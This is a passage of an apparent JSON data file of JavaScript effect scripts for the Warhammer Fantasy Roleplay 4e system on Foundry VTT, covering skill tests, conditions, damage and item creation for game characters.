(talentItem)\n    {\n        items.push(talentItem.toObject());\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n}\n\nfor (let trapping of trappings) \n{\n    let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n    if (trappingItem)\n    {\n        trappingItem = trappingItem.toObject()\n\n        equip(trappingItem)\n\n        items.push(trappingItem);\n    }\n    else \n    {\n        ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n    }\n}\n\nupdateObj.name = updateObj.name += \" \" + this.effect.name\n\nawait this.actor.update(updateObj)\nconsole.log(\">>>>>>><\", items)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","t48hkacYdOpzWvK9":"args.options.beatBlade = true;","t56mnblo1kv3gM1M":"return args.skill?.name.includes(\"Melee (Basic)\") || (args.type == \"weapon\" && args.item?.system.weaponGroup.value == \"basic\");","t8LYOuN5peEdWeXP":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.mNoCuaVbFBflfO6X\")\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","tCIT1a12Gt6k2ohA":"let resistance\nif (this.item.name.includes(\"(\") && !this.item.name.toLowerCase().includes(\"(any)\"))\n{\n\tresistance = this.item.parenthesesText\n}\nelse \n{\n    resistance = await ValueDialog.create(\"Enter Resistance\", \"Resistance\") \n    \n    if (resistance)\n    {\n        this.item.updateSource({name : `${this.item.name.split(\"(\")[0].trim()} (${resistance})`})\n        this.effect.updateSource({name : this.effect.name + ` (${resistance})`})\n    }\n}    \nthis.item.updateSource({\"system.tests.value\" : this.item.system.tests.value.replace(\"the associated Threat\", resistance)})\n\nif (resistance && !this.effect.name.includes(\"(\"))\n{\n    this.effect.updateSource({name : this.effect.name += ` (${resistance})`})\n}","tDrs0aNIYmZPsOoS":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"prone\")\n}\n","tFAKRRRfTjQfdQz3":"this.actor.getActiveTokens().forEach(t => t.document.update({\"texture.tint\" : \"\"}));","tG1qGqzBLmAR3WHm":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\nif (test.failed) \n{\n    let add = 0\n\n    if (test.result.roll % 11 == 0 || test.result.roll == 100) \n    {\n        add = 1 // can't use isFumble if no hit location\n    }\n\n     await this.actor.addCondition(\"stunned\", Math.max(1, Math.abs(test.result.SL)) + add)\n     await this.actor.addCondition(\"blinded\", Math.max(1, Math.abs(test.result.SL)))\n\n}","tGVEV6TLl310mFLP":"let nonmagical = args.modifiers.ap.value - args.modifiers.ap.magical\nif (args.applyAP && nonmagical) \n{\n    let nonmagical = args.modifiers.ap.value - args.modifiers.ap.magical\n    args.modifiers.ap.ignored += nonmagical\n    args.modifiers.ap.details.push(\"<strong>\" + this.effect.name + \"</strong>: Ignore Non-Magical AP (\" + nonmagical + \")\");\n}","tKBq1nGZo8t6vvQ6":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.5hH73j2NgPdsLCZN\");\nthis.actor.createEmbeddedDocuments(\"Item\", [item.toObject()], {fromEffect : this.effect.id})","tNTO1LVN7JqHf4YN":"if (args.test.characteristicKey == \"wp\") \n{\n    if (args.test.failed)\n    {\n        this.actor.createEmbeddedDocuments(\"ActiveEffect\", [game.wfrp4e.config.symptomEffects[\"malaise\"]])\n        this.script.scriptMessage(`Willpower Test failed, <b>${this.actor.prototypeToken.name}</b> gains @Condition[Malaise] for [[1d10]] hours`, {whisper: ChatMessage.getWhisperRecipients(\"GM\")})\n    }\n}","tUwP7TjrOOOnaCYJ":"let fatigued = this.actor.hasCondition(\"fatigued\")\nif (fatigued)\n{\n   this.script.scriptNotification(`Cleared ${fatigued.conditionValue} Fatigued Conditions`)\n   fatigued.delete();  \n}\nelse \n{\n\tthis.script.scriptNotification(`No Fatigued Conditions`)\n}","tcZug8ehU6lyYBd9":"return args.skill?.name != \"Ranged (Blackpowder)\"","tdICiJ26rJrDbxT6":"return args.characteristic != \"i\"","tfdKU6nmvUtEjXE2":"let choice = await Dialog.wait({\n    title : \"Choice\",\n    content : \n    `<p>\n    Select your choice\n    </p>\n    `,\n    buttons : {\n        1 : {\n            label : \"Shield\",\n            callback : () => {\n                return \"shield\"\n            }\n        },\n        2 : {\n            label : \"Two-Handed Weapon\",\n            callback : () => {\n                return \"twohanded\"\n            }\n        },\n    }\n})\n\nlet weapons = await game.wfrp4e.utility.findAll(\"weapon\", \"Loading Weapons\");\nlet items\nif (choice == \"shield\") \n{\n    items = await game.wfrp4e.apps.ItemDialog.create(weapons.filter(i => i.system.properties.qualities.shield), 1, \"Choose a Shield\");\n}\nelse if (choice == \"twohanded\")\n{\n    items = await game.wfrp4e.apps.ItemDialog.create(weapons.filter(i => i.system.weaponGroup.value == \"twohanded\"), 1, \"Choose a Two-Handed Weapon\");\n}\nitems = items.map(i => i.toObject())\n\nitems.forEach(i => equip(i))\n\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","tn6SwmjAuNzqE6dx":"let damage = 0\nlet test = await this.actor.setupSkill(\"Dodge\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`});\nawait test.roll();\n\nif (test.succeeded)\n{\n    damage = 10;\n}\nelse if (test.failed)\n{\n   damage = 20;\n}\n\nthis.script.scriptMessage(await this.actor.applyBasicDamage(damage, {loc : \"roll\", hideDSN: true, suppressMsg : true}))","tnE8LF6E3svIlLca":"return args.skill?.name == game.i18n.localize(\"NAME.Research\");","tnilBagajWM8UGQt":"return args.item?.name != game.i18n.localize(\"NAME.ConsumeAlcohol\")","toSrgcvWq9b5eN0K":"let location = await game.wfrp4e.tables.rollTable(\"hitloc\", {hideDSN: true})\n\nthis.item.updateSource({name : `${this.item.name} (${location.description})`})\nthis.script.scriptMessage(`<strong>Location:</strong> ${location.description}`, { whisper: ChatMessage.getWhisperRecipients(\"GM\") })","tolkNN5P7oOC8GKZ":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"difficult\"}})\nawait test.roll();\n\nif (test.failed)\n{\n    let sourceActor = this.effect.sourceActor;\n    if (sourceActor)\n    {\n        this.script.scriptMessage(await this.actor.applyBasicDamage(sourceActor.system.characteristics.wp.bonus, {suppressMsg : true, damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL}))\n    }\n}","tuIsytv3jl2yAIb2":"return args.skill?.name !== game.i18n.localize(\"NAME.Charm\") && args.skill?.name !== game.i18n.localize(\"NAME.Intimidate\") && args.skill?.name !== game.i18n.localize(\"NAME.Leadership\")","u3olS2p7Ls1JXfAH":"this.script.scriptMessage(await game.wfrp4e.tables.formatChatRoll(\"mutatephys\", {}, \"Tzeentch\"));","u5dNZ0s3lWfL8KFb":"return args.fields.charging","u6CYMSZADrfXd48Q":"args.fields.modifier += 20;","uACa6u4JLNMRgFlr":"const talents = await Promise.all([\"Furious Assault\", \"Sea Legs\"].map(game.wfrp4e.utility.findTalent))\nthis.actor.createEmbeddedDocuments(\"Item\", talents, {fromEffect : this.effect.id})","uAy4w7y8Uu9POF8C":"args.item.system.qualities.value.push({name : \"impact\"})","uLBDnWC3S0lRitbj":"let test = await this.actor.setupCharacteristic(\"int\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`})\nawait test.roll();\n\nlet opposedResult = test.opposedMessages[0]?.getOppose()?.resultMessage?.getOpposedTest()?.result\n\nif (opposedResult?.winner == \"attacker\")\n{\n    if (test.failed && (test.result.roll % 11 == 0 || test.result.roll == 100))\n    {\n        this.actor.addCondition(\"unconscious\")\n        await this.actor.update({\"system.status.corruption.value\" : parseInt(this.actor.status.corruption.value) + 1})\n        this.script.scriptMessage(\"Gained a Corruption point\", {whisper : ChatMessage.getWhisperRecipients(\"GM\")})\n    }\n    else \n    {\n        await this.actor.addCondition(\"stunned\", 1 + opposedResult.differenceSL);\n    }\n}\nelse \n{\n    return false;\n}","uNYstk3eXmWamhzs":"args.actor.addCondition(\"blinded\")","uOHAsKlkFuIaAmjb":"args.actor.modifyWounds(1)","uSwkYENTOcnfRrqA":"return !args.skill?.name.includes(game.i18n.localize(\"NAME.Melee\")) && args.weapon?.system?.attackType != \"melee\"","ucF4aiJ1gpDB333G":"if (args.test.options.catfall && (args.test.result.roll <= game.settings.get(\"wfrp4e\", \"automaticSuccess\") || args.test.result.roll <= args.test.target) && !args.test.result.catfall)\n{\n   args.test.result.other.push(`<b>${this.effect.name}</b>: Fall distance damage reduced by ${Number(args.test.result.SL) + 1} yards`)\n   args.test.result.catfall = true; // Prevent duplicate messages\n}","ugL5IBB6R2yWyMWd":"if (args.totalWoundLoss > 0)\n{\n    let apply = await Dialog.confirm({title : this.effect.name, content : `<p>Appy ${this.effect.name} Damage? Attacker must have used bare hands or a melee weapon made of metal.`})\n    if (apply)\n    {\n            \n        let damage = 5 + this.actor.characteristics.wp.bonus;\n        \n        let loc = args.opposedTest.attackerTest.weapon?.system.usesHands[0] || \"rArm\";\n        \n        let APatLoc = args.opposedTest.attacker.system.status.armour[loc];\n        \n        let metalAP = APatLoc.layers.reduce((metal, layer) => metal += (layer.metal ? layer.value : 0), 0)\n        \n        let APused = Math.max(0, APatLoc.value - metalAP); // remove metal AP at location;\n        \n        damage -= (APused + args.opposedTest.attacker.system.characteristics.t.bonus)\n        \n        let msg = await args.opposedTest.attacker.applyBasicDamage(damage, {suppressMsg : true, damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL});\n        msg += ` (ignored ${metalAP} metal AP on ${game.wfrp4e.config.locations[loc]})`\n        this.script.scriptMessage(msg)\n    }\n}","uhCq5NwjQ2a2idPn":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Tailor)';\nconst difficulty = 'easy';\nconst target = 30;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","upfK6GM33qZCZjll":"return args.item?.name != \"Play (Lute)\"","uwdQvZtzy2HVeEzx":"if (args.totalWoundLoss > 0)\n{\n    let roll = await new Roll(\"1d10\").roll();\n    roll.toMessage(this.script.getChatData());\n    args.modifiers.other.push({label : this.effect.name, value : roll.total})\n    \n    args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields : {difficulty : \"hard\"}, skipTargets: true, appendTitle :  \" - \" + this.effect.name}).then(async test => {\n        await test.roll();\n        if (test.failed)\n        {\n            this.script.scriptMessage(\"<strong>\" + args.actor.name + \"</strong> takes a @Table[critbody]{Critical Hit} to the torse\", {whisper: ChatMessage.getWhisperRecipients(\"GM\")}) \n        }\n    })\n}\n","ux3jaLpAUhZ5YqA6":"return args.item?.name != game.i18n.localize(\"NAME.Leadership\") && args.item?.name != game.i18n.localize(\"NAME.Cool\")","v00nVCRKqqRvY28t":"let test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: {difficulty: \"hard\"}});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"stunned\", 3)\n}\n","v18mmwUmuKiVfwzQ":"let test = await this.actor.setupTest(game.i18n.localize(\"NAME.Endurance\"), {appendTitle : ` - ${this.effect.name}`, skipTargets: true});\nawait test.roll();\nif (test.failed)\n{\n    this.actor.addCondition(\"stunned\");\n}","v4CCxVaVGf9i8U7X":"let cured = await Dialog.wait({\n    title : this.effect.name,\n    content : \"<p>Enter the number of diseases/poisons cured</p><input type='number'>\",\n    buttons : {\n        confirm : {\n            label : \"Confirm\",\n            callback : (dlg) => {\n                let input = dlg.find(\"input\");\n                value = parseInt(input[0].value);\n                return value;\n            }\n        }\n    }\n})\n\n\nlet damage = 0;\n\nlet rolls = new Array(cured).fill(\"\").map(i => `max(0, 1d10 - ${this.actor.system.characteristics.fel.bonus})`)\n\nlet test = new Roll(`${rolls.join(\" + \")}`);\nawait test.roll();\ntest.toMessage({speaker : {alias : this.actor.name}, flavor : this.effect.name});\nthis.script.scriptMessage(await this.actor.applyBasicDamage(test.total, { damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true }))","v4ITTsSY9EvCbhZP":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.9h82z72XGo9tfgQS\")\nthis.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id})","v5xrDWcrTNFJkyQB":"let choice1 = [\n    {\n        type : \"skill\",\n        name : \"Ranged (Bow)\",\n        diff : {\n            system : {\n                advances : {\n                    value : 10\n                }\n            }\n        }\n    },\n    {\n        type : \"weapon\",\n        name : \"Longbow\",\n    },\n    {\n        type : \"ammunition\",\n        name : \"Arrow\",\n    }\n]\nlet choice2 = [\n]\n\nlet choice = await Dialog.wait({\n    title : \"Option\",\n    content : \n    `<p>\n    Add Option?\n    </p>\n    <ol>\n    <li>Ranged (Bow) +10 and a Longbow with 12 Arrows</li>\n    </ol> \n    `,\n    buttons : {\n        1 : {\n            label : \"Yes\",\n            callback : () => {\n                return choice1;\n            }\n        },\n        2 : {\n            label : \"No\",\n            callback : () => {\n                return choice2;\n            }\n        }\n    }\n})\n\nlet updateObj = this.actor.toObject();\nlet items = []\nfor (let c of choice)\n{\n    let existing \n    if (c.type == \"skill\")\n    {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type)\n        if (existing && c.diff?.system?.advances?.value)\n        {\n            existing.system.advances.value += c.diff.system.advances.value\n        }\n    }\n\n    if (!existing)\n    {\n        let item = await game.wfrp4e.utility.find(c.name, c.type)\n        if (item)\n        {\n            item = item.toObject()\n            equip(item);\n                items.push(foundry.utils.mergeObject(item, (c.diff || {})))\n        }\n        else\n            ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n    }\n\n}\nawait this.actor.update(updateObj)\nthis.actor.createEmbeddedDocuments(\"Item\", items);\n\nfunction equip(item)\n{\n    if (item.type == \"armour\")\n        item.system.worn.value = true\n    else if (item.type == \"weapon\")\n        item.system.equipped = true\n    else if (item.type == \"trapping\" && item.system.trappingType.value == \"clothingAccessories\")\n        item.system.worn = true\n}","v6LIG7EwWYALxCpP":"return !this.effect.getFlag(\"wfrp4e\", \"trained\")?.includes(\"entertain\") || (!args.skill?.name.includes(game.i18n.localize(\"NAME.Entertain\")) && !args.skill?.name.includes(game.i18n.localize(\"NAME.Perform\")) && !args.skill?.name.includes(game.i18n.localize(\"NAME.Play\")))","vFUVWZ1l8wpTjLcx":"if (!this.actor.has(game.i18n.localize(\"NAME.Daemonic\")))\n    return\n\nlet caster = this.effect.sourceActor;\nif (caster) \n{\n    let wp = caster.system.characteristics.wp\n    if (this.actor.system.characteristics.wp.value >= wp.value)\n    {\n        this.script.scriptNotification(\"Target has higher Willpower, no effect\")\n        return\n    }\n    this.actor.applyBasicDamage(wp.bonus, { damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL })\n}","vJQRBxDfPwHens0a":"if (args.totalWoundLoss > 0) \n{\n    args.actor.setupCharacteristic(\"t\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields: { difficulty: \"difficult\" } }).then(async test => {\n        await test.roll();\n        if (test.failed) \n        {\n           await args.actor.addCondition(\"poisoned\")\n            this.script.scriptMessage(await args.actor.applyBasicDamage(3, {suppressMsg : true, damageType: game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL }))\n        }\n    })\n}","vM2BPwYhHQaBAt2C":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.KII1gWnxIZ8HzmU5\");\nlet data = item.toObject();\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect: this.effect.id})","vNp9wgdSvnNEjZyS":"args.fields.slBonus -= 2; ","vPG4rV640aSzKzxe":"return !this.actor.flags.useless[this.item.system.location.key[0] + \"Arm\"] || [\"fel\", \"wp\", \"int\", \"t\"].includes(args.characteristic)","vS2D9QUslR7ZtXXm":"let test = await this.actor.setupCharacteristic(\"t\", {skipTargets: true, appendTitle :  ` - ${this.effect.name}`, fields : {difficulty : \"hard\"}})\nawait test.roll();\nif (test.failed)\n{\n    let roll = await new Roll(\"1d10\").roll();\n    roll.toMessage(this.script.getChatData())\n\n    this.script.scriptMessage(await this.actor.applyBasicDamage(roll.total, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_AP, suppressMsg : true}))\n}","vSDMygIT9nNvEGWG":"// Each time the blade is used, the GM should secretly roll a d10.\n// On a 1, its poison has run dry, \n// and the next time it is employed it will shatter.\n\nif (Math.ceil(CONFIG.Dice.randomUniform() * 10) == 1) {\n  this.item.setFlag(\"wfrp4e\", \"brittle\", true)\n  ChatMessage.create({\n    content: `\n      <strong>${this.item.name}</strong> has run out of poison. It will shatter the next time it is used.`, \n    whisper: ChatMessage.getWhisperRecipients(\"GM\"),\n    blind: true\n  })\n}\n","vTebTUzXortx1Qut":"let specification = Number(this.item.specification.value) || 1;\nargs.actor.system.characteristics.t.initial += 10 * specification;\nargs.actor.system.status.carries.max -= Math.floor(args.actor.system.status.carries.max * 0.1 * specification);\nargs.actor.system.details.price.gc += args.actor.system.details.price.gc * 0.1 * specification;","vUpMQlbwDiYfMCNS":"this.actor.addCondition(\"ablaze\");","vY3xeTTL3ghPrJpN":"this.actor.addCondition(\"entangled\");","vZ5HCrhY8e4R1TrG":"let eye = await fromUuid(\"Compendium.wfrp4e-core.items.weczkAMPlTjX7lqU\")\nlet nose = await fromUuid(\"Compendium.wfrp4e-core.items.SpPRZZRHxly7uo2G\")\nthis.actor.createEmbeddedDocuments(\"Item\", [eye, nose]);","vc4bELo0cWYoILfB":"let choice = await ItemDialog.create(this.actor.itemTypes.disease, 1, \"Choose a disease to heal (must be naturally occuring)\")\n\nthis.script.scriptMessage(`Cured <strong>${choice[0]?.name}</strong>`);\nchoice[0].delete()","vc8eVKtyjtOGvWlK":"if (!this.actor.hasCondition(\"entangled\"))\n{\n    this.effect.delete();\n}","vcM0IgsYVmfWrlO3":"fromUuid(\"Compendium.wfrp4e-core.items.rOV2s6PQBBrhpMOv\").then(item => {\n    this.actor.createEmbeddedDocuments(\"Item\", [item], {fromEffect : this.effect.id});\n})","vejhfB9aI58iF1vr":"let choice1 = [\n    {\n        type: \"trait\",\n        name: \"Disease\",\n    },\n    {\n        type: \"trait\",\n        name: \"Infected\",\n    },\n    {\n        type: \"trait\",\n        name: \"Distracting\",\n    },\n    {\n        type: \"trait\",\n        name: \"Infestation\",\n    },\n    {\n        type: \"trait\",\n        name: \"Territorial\",\n    }\n]\n\nlet updateObj;\nlet actor;\n\nasync function addTrait(c) {\n    let items = [];\n    console.log(\"TEST1\", c);\n    let existing;\n    if (c.type == \"trait\") {\n        existing = updateObj.items.find(i => i.name == c.name && i.type == c.type);\n    }\n    console.log(\"TEST\", existing);\n    if (!existing) {\n        let item = await game.wfrp4e.utility.find(c.name, c.type);\n        if (item) {\n            item = item.toObject();\n            items.push(item);\n        }\n        else\n            ui.notifications.warn(`Could not find ${c}`, { permanent: true });\n    }\n    console.log(\"WISH LIST2\", choice1, items);\n    actor.createEmbeddedDocuments(\"Item\", items);\n}\n\nasync function dialogChoice() {\n    for (let c of choice1) {\n        await new Dialog({\n            title: \"Option\",\n            content:\n                `<p>\n            Add Option?\n            </p>\n            <ol>\n            <li>${c.name}</li>\n            </ol> \n            `,\n            buttons: {\n                1: {\n                    label: \"Yes\",\n                    callback: () => {\n                        addTrait(c)\n                        c.valid = true;\n                    }\n                },\n                2: {\n                    label: \"No\",\n                    callback: () => {\n                    }\n                }\n            }\n        }).render(true)\n    }\n}\n\nupdateObj = this.actor.toObject();\nactor = this.actor\nawait dialogChoice();\n\n","vgfs0DXvF5iKrz1M":"return args.characteristic != \"ag\" || this.item.getFlag(\"wfrp4e\", \"passed\")","vj3zArmX27vCxYJW":"return ![\"NAME.Perception\", \"NAME.Navigation\"].map(i => game.i18n.localize(i)).includes(args.skill?.name)","vjyTKcNrJzX4XWnS":"let SL = parseInt(this.effect.sourceTest.result.SL)\nif (SL < 0)\n   SL = 0\nthis.actor.addCondition(\"fatigued\", 1 + SL)","vuzRRj5d9XdNYx3o":"let broken = this.actor.hasCondition(\"broken\")\nif (broken)\n{\n    broken.delete();\n    this.script.scriptNotification(\"Removed Broken\")\n}","vvVhAqreedtmOR9b":"args.totalWoundLoss = Math.max(0, args.totalWoundLoss - 1)\nargs.modifiers.other.push({label : this.effect.name, value : -1)","vvdo1NxjmGVkmFCT":"await this.actor.addCondition(\"stunned\");\nlet test = await this.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\"), {fields: {difficulty : \"hard\"}, skipTargets: true, appendTitle :  \" - \" + this.effect.name})\nawait test.roll();\nif (test.failed)\n{\n\tawait this.actor.addCondition(\"prone\")\n\tawait this.actor.addCondition(\"stunned\")\n}\n          \nlet location = this.item.system.location.key;\n\nif (location)\n{\n    let dropped = this.item.system.weaponsAtLocation;\n\n    if (dropped.length)\n    {\n        this.script.scriptNotification(`Dropped ${dropped.map(i => i.name).join(\", \")}!`)\n        for(let weapon of dropped)\n        {\n            await weapon.system.toggleEquip();\n        }\n    }\n}","vzMxIDjRlQSxXtCW":"// Remove the miscast if doubles rolled and succeeded\nif(args.test.succeeded && args.test.result.minormis && args.test.result.roll % 11 == 0)\n{\n    delete args.test.result.minormis\n}\n// Decrement the major miscast to minor miscast\nelse if(args.test.succeeded && args.test.result.majormis && args.test.result.roll % 11 == 0)\n{\n    delete args.test.result.majormis\n    args.test.result.minormis = game.i18n.localize(\"ROLL.MinorMis\")\n}","w3r54pKZQKaH2Yer":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.Item.pTorrE0l3VybAbtn\")\nlet data = item.toObject();\nlet slOver = this.effect.sourceTest.result.slOver;\nlet overcast = this.effect.sourceTest.result.overcast\nslOver -= ((overcast.total - overcast.available) * 2) // If they used an overcast, subtract 2 SL for each one\nlet added = Math.floor(slOver / 3) || 0\ndata.system.specification.value = 1 + added; // For each +3 SL, add 1 specification\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","w4JKuTECFmu3YmTR":"return !args.skill?.name?.includes(game.i18n.localize(\"NAME.Ride\"))","w4RuGIfseGoxXA3k":"const repaired_message = `<p>Finished repairing <em>${this.item.name}</em>.</p>`;\nconst test = 'Trade (Carpenter)';\nconst difficulty = 'challenging';\nconst target = 20;\n\nconst extendedTestData = {\n  name: this.item.name,\n  type: \"extendedTest\",\n  img: this.item.img,\n  system: {\n    SL: {\n      current: 0,\n      target: target\n    },\n    test: {\n      value: test\n    },\n    completion: {\n      value: \"remove\"\n    },\n    difficulty: {\n      value: difficulty\n    }\n  },\n  effects: [\n    {\n      name: `Repair the ${this.item.name}`,\n      icon: this.item.img,\n      flags: {\n        wfrp4e: {\n          applicationData: {\n            type: \"document\",\n            documentType: \"Item\"\n          },\n          scriptData: [\n            {\n              label: this.item.name,\n              script: `\n              let id = this.item.flags.wfrp4e.fromEffect;\n              let effect = this.actor.appliedEffects.find(e => e.id === id);\n              this.script.scriptMessage(\"${repaired_message}\");\n              await effect.item.delete();\n            `,\n              trigger: \"deleteEffect\"\n            }\n          ]\n        }\n      }\n      }\n  ]\n};\n\nawait this.actor.createEmbeddedDocuments(\"Item\", [extendedTestData], {fromEffect: this.effect.id});\n","w4zubIHP0XgMXsFe":"return !args.options.terror && !args.extendedTest?.getFlag(\"wfrp4e\", \"fear\");","w7K0lbxQKJ2tsc6f":"let item = await fromUuid(\"Compendium.wfrp4e-core.items.EO05HX7jql0g605A\")\nlet data = item.toObject();\ndata.system.specification.value = 60\nthis.actor.createEmbeddedDocuments(\"Item\", [data], {fromEffect : this.effect.id})","wAETU6aTRr9d4oCU":"args.fields.slBonus++;","wAntJhgb8Og5vJXh":"args.options.staunchBleeding = true;","wRxgpGmlUpe7nwzJ":"this.actor.getActiveTokens().forEach(t => t.document.update({light : {\n      \"dim\": 0,\n      \"bright\": 0,\n      \"angle\": 360,\n      \"alpha\": 0.5,\n      \"animation\": {\n          \"speed\": 0,\n          \"intensity\": 0,\n          \"type\": \"none\",\n      },\n      \"color\": \"\",\n  }}));","wS6OIR3QN4mOUHn0":"if (args.totalWoundLoss > args.actor.characteristics.t.bonus)\n{\n  args.actor.setupSkill(game.i18n.localize(\"NAME.Endurance\")).then(async test => {\n    await test.roll()\n    if (test.failed) {\n      let disease = await fromUuid(\"Compendium.wfrp4e-core.items.M8XyRs9DN12XsFTQ\")\n      disease = disease.toObject()\n      disease.system.duration.active = true\n      args.actor.createEmbeddedDocuments(\"Item\", [disease])\n    }\n  })\n}","wUlYLBT59Efys5aS":"args.actor.addCondition(\"prone\");","wbM7tpw4TxvadcWm":"let items = this.effect.itemTargets;\nlet msg = \"\";\nfor(let item of items)\n{\n    if (item.system.properties.qualities.durable)\n    {\n        await item.update({\"system.qualities.value\" : []});\n        msg += `<p>${item.name} loses all Qualities</p>`\n    }\n    else \n    {\n        msg += `<p>${item.name} crumbles into dust!</p>` \n        await item.update({name : item.name + \" (Dust)\"})\n    }\n}\nif(msg)\n{\n    this.script.scriptMessage(msg);\n}","whUSkaR1yem21bXp":"let characteristics = {\n  \"ws\" : 10,\n  \"bs\" : 5,\n  \"s\" : 0,\n  \"t\" : 5,\n  \"i\" : 10,\n  \"ag\" : 0,\n  \"dex\" : 6,\n  \"int\" : -5,\n  \"wp\" : 0,\n  \"fel\" : 10\n}\nlet skills = [\"Melee (Basic)\", \"Track\"]\nlet skillAdvancements = [8, 7]\nlet talents = [\"Berserk Charge\", \"Careful Strike\", \"Strike to Injure\"]\nlet traits = [\"Flight (8)\", \"Fury\", \"Swarm\", \"Tracker\"]\nlet trappings = []\nlet items = [];\nlet spells = [];\n\nlet updateObj = this.actor.toObject();\n\nfor (let ch in characteristics)\n{\n  updateObj.system.characteristics[ch].modifier += characteristics[ch];\n}\n\nfor (let index = 0; index < skills.length; index++)\n{\n  let skill = skills[index]\n  let skillItem;\n  skillItem = updateObj.items.find(i => i.name == skill && i.type == \"skill\")\n  if (skillItem)\n      skillItem.system.advances.value += skillAdvancements[index]\n  else \n  {\n      skillItem = await game.wfrp4e.utility.findSkill(skill)\n      skillItem = skillItem.toObject();\n      skillItem.system.advances.value = skillAdvancements[index];\n      items.push(skillItem);\n  }\n}\n\nfor (let talent of talents)\n{\n  let talentItem = await game.wfrp4e.utility.findTalent(talent)\n  if (talentItem)\n  {\n      items.push(talentItem.toObject());\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${talent}`, {permanent : true})\n  }\n}\n\nconst traitRegex = /(?:,?(.+?)(\\+?\\d{1,2}\\+?)?\\s*?(?:\\((.+?)\\)\\s*(\\+?\\d{1,2})?|,|$))/gm\nfor (let trait of traits)\n{\n  let traitMatches = trait.matchAll(traitRegex).next().value\n  let traitName = traitMatches[1]\n  let traitVal = traitMatches[2] || traitMatches[4] // could be match 2 or 4 depending on if there's a specialization\n  let traitSpec = traitMatches[3]\n\n  let traitItem;\n  try {\n      traitItem = await WFRP_Utility.findItem(traitName, \"trait\")\n  }\n  catch { }\n  if (!traitItem) {\n      ui.notifications.warn(`Could not find ${trait}`, {permanent : true})\n  }\n  traitItem = traitItem.toObject()\n\n  if (Number.isNumeric(traitVal))\n  {\n      traitItem.system.specification.value = traitName.includes('Weapon','Horns','Tail','Tentacles','Bite') ? traitVal - parseInt(characteristicValues[3]/10) : traitVal;\n      traitItem.name = (traitItem.name +  ` ${traitSpec ? \"(\"+ traitSpec + \")\" : \"\"}`).trim()\n  }\n  else \n      traitItem.system.specification.value = traitSpec\n\n  items.push(traitItem)\n\n}\n\nfor (let trapping of trappings) \n{\n  let trappingItem = await game.wfrp4e.utility.findItem(trapping)\n  if (trappingItem)\n  {\n      trappingItem = trappingItem.toObject()\n\n      equip(trappingItem)\n\n      items.push(trappingItem);\n  }\n  else \n  {\n      ui.notifications.warn(`Could not find ${trapping}`, {permanent : true})\n  }\n}\n\nfor (let spell of spells) \n{\n  let spellItem = await game.wfrp4e.utility.findItem(spell)\n  if (spellItem)\n  {\n      spellItem = spellItem.toObject()\n\n      items.push(spellItem);\n  }\n  else \n  {\n      